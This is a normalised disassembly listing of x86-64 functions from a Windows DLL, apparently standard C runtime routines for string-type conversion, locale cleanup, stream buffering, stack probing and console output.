mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_180027b88
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_18001db70
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_1800278bc
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180027c20
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov esi [ rbp + 0x68 ]
xor edi edi
mov r13d r9d
mov r14 r8
mov r15d edx
test esi esi
jne r-xdata
neg [ rbp + 0x70 ]
mov ecx esi
mov [ rsp + 0x28 ] edi
sbb edx edx
mov [ rsp + 0x20 ] rdi
and edx 0x8
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov esi [ rax + 0x4 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_18001d1f0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r8 r12
xor edx edx
mov rcx rbx
add r8 r8
call sub_18001c9f0
mov r9d r13d
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rbx
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov edi eax
call sub_18001d820
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_18001c80c
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_1800285c0
sub rsp rax
lea rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_180027d80
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_18001db70
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0x98 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] r11d
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_180027c20
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180027e00
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_18001c80c
mov rcx [ rbx + 0x10 ]
call sub_18001c80c
mov rcx [ rbx + 0x18 ]
call sub_18001c80c
mov rcx [ rbx + 0x20 ]
call sub_18001c80c
mov rcx [ rbx + 0x28 ]
call sub_18001c80c
mov rcx [ rbx + 0x30 ]
call sub_18001c80c
mov rcx [ rbx ]
call sub_18001c80c
mov rcx [ rbx + 0x40 ]
call sub_18001c80c
mov rcx [ rbx + 0x48 ]
call sub_18001c80c
mov rcx [ rbx + 0x50 ]
call sub_18001c80c
mov rcx [ rbx + 0x58 ]
call sub_18001c80c
mov rcx [ rbx + 0x60 ]
call sub_18001c80c
mov rcx [ rbx + 0x68 ]
call sub_18001c80c
mov rcx [ rbx + 0x38 ]
call sub_18001c80c
mov rcx [ rbx + 0x70 ]
call sub_18001c80c
mov rcx [ rbx + 0x78 ]
call sub_18001c80c
mov rcx [ rbx + 0x80 ]
call sub_18001c80c
mov rcx [ rbx + 0x88 ]
call sub_18001c80c
mov rcx [ rbx + 0x90 ]
call sub_18001c80c
mov rcx [ rbx + 0x98 ]
call sub_18001c80c
mov rcx [ rbx + 0xa0 ]
call sub_18001c80c
mov rcx [ rbx + 0xa8 ]
call sub_18001c80c
mov rcx [ rbx + 0xb0 ]
call sub_18001c80c
mov rcx [ rbx + 0xb8 ]
call sub_18001c80c
mov rcx [ rbx + 0xc0 ]
call sub_18001c80c
mov rcx [ rbx + 0xc8 ]
call sub_18001c80c
mov rcx [ rbx + 0xd0 ]
call sub_18001c80c
mov rcx [ rbx + 0xd8 ]
call sub_18001c80c
mov rcx [ rbx + 0xe0 ]
call sub_18001c80c
mov rcx [ rbx + 0xe8 ]
call sub_18001c80c
mov rcx [ rbx + 0xf0 ]
call sub_18001c80c
mov rcx [ rbx + 0xf8 ]
call sub_18001c80c
mov rcx [ rbx + 0x100 ]
call sub_18001c80c
mov rcx [ rbx + 0x108 ]
call sub_18001c80c
mov rcx [ rbx + 0x110 ]
call sub_18001c80c
mov rcx [ rbx + 0x118 ]
call sub_18001c80c
mov rcx [ rbx + 0x120 ]
call sub_18001c80c
mov rcx [ rbx + 0x128 ]
call sub_18001c80c
mov rcx [ rbx + 0x130 ]
call sub_18001c80c
mov rcx [ rbx + 0x138 ]
call sub_18001c80c
mov rcx [ rbx + 0x140 ]
call sub_18001c80c
mov rcx [ rbx + 0x148 ]
call sub_18001c80c
mov rcx [ rbx + 0x150 ]
call sub_18001c80c
mov rcx [ rbx + 0x170 ]
call sub_18001c80c
mov rcx [ rbx + 0x178 ]
call sub_18001c80c
mov rcx [ rbx + 0x180 ]
call sub_18001c80c
mov rcx [ rbx + 0x188 ]
call sub_18001c80c
mov rcx [ rbx + 0x190 ]
call sub_18001c80c
mov rcx [ rbx + 0x198 ]
call sub_18001c80c
mov rcx [ rbx + 0x168 ]
call sub_18001c80c
mov rcx [ rbx + 0x1a8 ]
call sub_18001c80c
mov rcx [ rbx + 0x1b0 ]
call sub_18001c80c
mov rcx [ rbx + 0x1b8 ]
call sub_18001c80c
mov rcx [ rbx + 0x1c0 ]
call sub_18001c80c
mov rcx [ rbx + 0x1c8 ]
call sub_18001c80c
mov rcx [ rbx + 0x1d0 ]
call sub_18001c80c
mov rcx [ rbx + 0x1a0 ]
call sub_18001c80c
mov rcx [ rbx + 0x1d8 ]
call sub_18001c80c
mov rcx [ rbx + 0x1e0 ]
call sub_18001c80c
mov rcx [ rbx + 0x1e8 ]
call sub_18001c80c
mov rcx [ rbx + 0x1f0 ]
call sub_18001c80c
mov rcx [ rbx + 0x1f8 ]
call sub_18001c80c
mov rcx [ rbx + 0x200 ]
call sub_18001c80c
mov rcx [ rbx + 0x208 ]
call sub_18001c80c
mov rcx [ rbx + 0x210 ]
call sub_18001c80c
mov rcx [ rbx + 0x218 ]
call sub_18001c80c
mov rcx [ rbx + 0x220 ]
call sub_18001c80c
mov rcx [ rbx + 0x228 ]
call sub_18001c80c
mov rcx [ rbx + 0x230 ]
call sub_18001c80c
mov rcx [ rbx + 0x238 ]
call sub_18001c80c
mov rcx [ rbx + 0x240 ]
call sub_18001c80c
mov rcx [ rbx + 0x248 ]
call sub_18001c80c
mov rcx [ rbx + 0x250 ]
call sub_18001c80c
mov rcx [ rbx + 0x258 ]
call sub_18001c80c
mov rcx [ rbx + 0x260 ]
call sub_18001c80c
mov rcx [ rbx + 0x268 ]
call sub_18001c80c
mov rcx [ rbx + 0x270 ]
call sub_18001c80c
mov rcx [ rbx + 0x278 ]
call sub_18001c80c
mov rcx [ rbx + 0x280 ]
call sub_18001c80c
mov rcx [ rbx + 0x288 ]
call sub_18001c80c
mov rcx [ rbx + 0x290 ]
call sub_18001c80c
mov rcx [ rbx + 0x298 ]
call sub_18001c80c
mov rcx [ rbx + 0x2a0 ]
call sub_18001c80c
mov rcx [ rbx + 0x2a8 ]
call sub_18001c80c
mov rcx [ rbx + 0x2b0 ]
call sub_18001c80c
mov rcx [ rbx + 0x2b8 ]
call sub_18001c80c
add rsp 0x20
pop rbx
sub_1800281f0
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x8 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x10 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x58 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x60 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
add rsp 0x20
pop rbx
call sub_18001c80c
sub_18002825c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
cmp rcx [ rw-data ]
je r-xdata
mov rcx [ rbx + 0x20 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x28 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x30 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x38 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x40 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x48 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x68 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x70 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x78 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x80 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x88 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
mov rcx [ rbx + 0x90 ]
cmp rcx [ rw-data ]
je r-xdata
call sub_18001c80c
add rsp 0x20
pop rbx
call sub_18001c80c
sub_180028368
mov [ rsp + 0x10 ] rsi
push rbp
push rdi
push r12
mov rbp rsp
sub rsp 0x60
movsxd rdi ecx
mov r12d edx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_18001db70
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rbp - 0x20 ]
sar esi 0x8
movzx ecx sil
call sub_180026cb0
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rbp + 0x38 ] dil
mov [ rbp + 0x39 ] 0x0
mov r9d edx
mov [ rbp + 0x38 ] sil
mov [ rbp + 0x39 ] dil
mov [ rbp + 0x3a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax r12d
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
cmp [ rbp - 0x8 ] al
je r-xdata
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rbp + 0x38 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rbp - 0x20 ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x20 ] rax
call sub_180027d80
test eax eax
jne r-xdata
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180028460
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_180028518
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov ebx edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov edi r9d
mov esi r8d
call sub_18001db70
mov rax [ rsp + 0x28 ]
movzx r11d bl
test [ r11 + rax + 0x1d ] dil
jne r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax esi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1800285c0
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_18002861c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
call sub_18001e704
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
dec ecx
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_1800286c8
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001e704
and [ rax ] 0x0
call sub_18001e6e4
mov [ rax ] 0x9
jmp r-xdata
call sub_18001e704
and [ rax ] 0x0
call sub_18001e6e4
mov [ rax ] 0x9
call sub_1800207e0
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x28
retn
sub_18002873c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r14
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r14 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_1800259a4
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r14
retn
mov rcx [ r14 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_1800258a4
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
neg eax
sbb edx edx
and edi edx
inc [ rbx + rsi + 0xc ]
sub_18002880c
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
cmp rcx 0xffffffffffffffff
jne r-xdata
call sub_180029084
mov rcx [ rw-data ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_180028868
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor edi edi
lea ecx [ rdi + 0x1 ]
call sub_1800259a4
nop
lea ebx [ rdi + 0x3 ]
mov ecx 0x1
call sub_1800258a4
mov eax edi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rcx [ rax + rsi * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_180029160
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rsi * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + rsi * 8 ]
call sub_18001c80c
mov r11 [ rw-data ]
and [ r11 + rsi * 8 ] 0x0
inc edi
mov [ rsp + 0x24 ] edi
sub_180028914
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_1800268f0
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_180026548
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_180028990
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_180028914
test eax eax
je r-xdata
add rsp 0x20
pop rbx
jmp sub_1800289dc
test [ rbx + 0x18 ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov rcx rbx
call sub_1800268f0
mov ecx eax
call sub_1800291c8
neg eax
sbb eax eax
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_1800289dc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r15
sub rsp 0x30
mov r13d ecx
xor esi esi
xor edi edi
lea ecx [ rsi + 0x1 ]
call sub_1800259a4
nop
xor ebx ebx
or r15d 0xffffffff
mov ecx 0x1
call sub_1800258a4
cmp r13d 0x1
cmove edi esi
mov eax edi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r13
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rdx [ rax + r12 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
mov ecx ebx
call sub_180026850
nop
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r12 * 8 ]
mov ecx ebx
call sub_1800268d0
cmp r13d 0x1
jne r-xdata
test r13d r13d
jne r-xdata
call sub_180028990
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc esi
mov [ rsp + 0x24 ] esi
jmp r-xdata
call sub_180028990
cmp eax r15d
cmove edi r15d
mov [ rsp + 0x28 ] edi
sub_180028ad4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov r12d ecx
mov rcx rdx
mov rbx rdx
call sub_1800268f0
mov edx [ rbx + 0x18 ]
movsxd rsi eax
test dl 0x82
jne r-xdata
test dl 0x40
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
xor edi edi
test dl 0x1
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test dl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_1800266dc
add rax 0x30
cmp rbx rax
je r-xdata
or edx 0x20
mov [ rbx + 0x18 ] edx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and edx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] edx
mov ebp 0x2
lea rdx [ rsp + 0x48 ]
mov ecx esi
mov r8d ebp
mov [ rsp + 0x48 ] r12w
call sub_180026548
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x2 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
sub eax 0x2
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_18002667c
test eax eax
jne r-xdata
call sub_1800266dc
add rax 0x60
cmp rbx rax
jne r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax r12w
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_180026548
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_180026628
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rax [ rbx + 0x10 ]
mov [ rax ] r12w
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_180025d04
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_180028c64
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
test al 0x83
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
jmp r-xdata
mov eax 0xffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ rcx + 0x18 ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ rcx + 0x18 ] eax
jmp r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx ] rax
call sub_180026628
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ rdi + 0x18 ] eax
and [ rdi + 0x8 ] 0x0
cmp eax 0x1
je r-xdata
mov rcx rdi
call sub_1800268f0
mov r8d [ rdi + 0x24 ]
mov rdx [ rdi + 0x10 ]
mov ecx eax
call sub_1800299c4
mov [ rdi + 0x8 ] eax
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
test [ rdi + 0x18 ] 0x82
jne r-xdata
cmp [ rdi + 0x24 ] 0x200
jne r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xffffffff
je r-xdata
mov rcx [ rdi ]
add [ rdi + 0x8 ] 0xfffffffe
movzx eax [ rcx ]
add rcx 0x2
mov [ rdi ] rcx
jmp r-xdata
test [ rdi + 0x18 ] 0x8
je r-xdata
lea r11 [ rw-data ]
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax [ rdi + 0x24 ]
test [ rdi + 0x18 ] 0x400
mov ecx 0x1000
cmove eax ecx
mov [ rdi + 0x24 ] eax
bts [ rdi + 0x18 ] 0xd
mov rcx rdi
call sub_1800268f0
mov rcx rdi
lea rsi [ rw-data ]
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ rsi + rbx * 8 ]
jmp r-xdata
mov al [ r11 + 0x8 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_180028dc4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx rdx
mov edi ecx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
mov rcx rdx
call sub_1800268f0
lea rdx [ rw-data ]
lea r8 [ rw-data ]
movsxd r11 eax
cmp r11d 0xffffffff
je r-xdata
or eax 0xffffffff
test [ rbx + 0x18 ] 0x1
jne r-xdata
mov rcx rdx
cmp r11d 0xfffffffe
je r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
test [ rbx + 0x18 ] 0x80
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
cmp r11d 0xffffffff
je r-xdata
mov rcx r11
mov rax r11
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ r8 + rax * 8 ]
jmp r-xdata
mov rax [ rbx ]
cmp rax [ rbx + 0x10 ]
jne r-xdata
mov rcx rbx
call sub_180026628
test [ rbx + 0x18 ] 0x2
jne r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp r11d 0xfffffffe
je r-xdata
test [ rcx + 0x38 ] 0x7f
jne r-xdata
dec [ rbx ]
test [ rbx + 0x18 ] 0x40
mov rax [ rbx ]
je r-xdata
cmp [ rbx + 0x8 ] 0x0
jne r-xdata
mov rdx r11
mov rax r11
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r8 + rax * 8 ]
mov [ rax ] dil
cmp [ rax ] dil
je r-xdata
inc rax
mov [ rbx ] rax
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
inc [ rbx + 0x8 ]
and [ rbx + 0x18 ] 0xffffffef
or [ rbx + 0x18 ] 0x1
movzx eax dil
jmp r-xdata
inc rax
mov [ rbx ] rax
jmp r-xdata
sub_180028ed0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x20
mov rbx rdx
mov edi ecx
xor eax eax
test rdx rdx
setne al
test eax eax
jne r-xdata
mov rcx rdx
call sub_1800267ec
nop
mov rdx rbx
